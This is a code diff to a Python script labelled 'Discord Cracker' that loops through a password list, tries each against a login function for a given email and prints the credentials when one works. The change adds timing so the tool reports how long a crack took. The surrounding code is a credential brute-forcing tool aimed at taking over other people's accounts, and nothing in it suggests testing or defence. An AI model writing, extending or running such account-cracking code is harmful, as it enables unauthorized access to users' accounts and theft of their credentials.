@@ -2,6 +2,9 @@ import requests
 from colorama import Fore, Style
 from datetime import datetime
 import os
+import time
+
+start_time = None 
 
 def log(message, level="INFO"):
     timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
@@ -13,6 +16,17 @@ def log(message, level="INFO"):
         print(f"{timestamp} {Fore.RED}[ERROR]{Fore.RESET} {message}")
     else:
         print(message)
+
+def start_timer():
+    global start_time
+    start_time = time.time()
+
+def stop_timer():
+    global start_time
+    end_time = time.time()
+    elapsed_time = end_time - start_time
+    elapsed_time_str = time.strftime("%H:%M:%S", time.gmtime(elapsed_time))
+    return elapsed_time_str
 
 def main():
     log("YT: Discord Cracker")
@@ -36,6 +50,8 @@ def main():
 
         log("Trying passwords...\n")
 
+        start_timer()
+
         for password in passwords:
             log(f"Testing password: {password}... ", "INFO")
             login_result = test_login(email, password)
@@ -44,6 +60,8 @@ def main():
                 log("\n\n\nCracked successful!", "INFO")
                 log(f"email: {email}", "INFO")
                 log(f"password: {password}", "INFO")
+                elapsed_time_str = stop_timer()  # Stop the timer
+                log(f"Time taken: {elapsed_time_str}", "INFO")
                 break
             else:
                 log("Login failed.")
@@ -52,12 +70,16 @@ def main():
     else:
         password = input("Enter your password: ")
 
+        start_timer() 
+
         while True:
             log(f"Trying password: {password}... ", "INFO")
             login_result = test_login(email, password)
 
             if login_result:
                 log("Login successful!", "INFO")
+                elapsed_time_str = stop_timer()  # Stop the timer
+                log(f"Time taken: {elapsed_time_str}", "INFO")
                 break
             else:
                 log("Login failed.")
